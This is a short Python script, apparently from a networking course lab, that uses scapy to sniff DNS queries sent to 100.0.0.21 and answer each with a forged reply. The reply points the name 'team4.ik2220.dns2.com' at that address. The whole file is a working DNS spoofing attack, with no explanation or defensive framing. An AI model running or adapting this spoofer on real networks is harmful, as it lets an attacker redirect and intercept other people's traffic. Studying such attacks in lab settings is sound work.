from scapy.all import *

def dns_spoof(pkt):
     #    if domain in pkt[DNS].qd.qname:
    spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                        UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                        DNS(id=pkt[DNS].id,ancount=1,\
                            an=DNSRR(rrname="team4.ik2220.dns2.com",rdata="100.0.0.21"))
    send(spoofed_pkt)
sniff(filter='udp port 53 and ip dst 100.0.0.21', prn=dns_spoof)
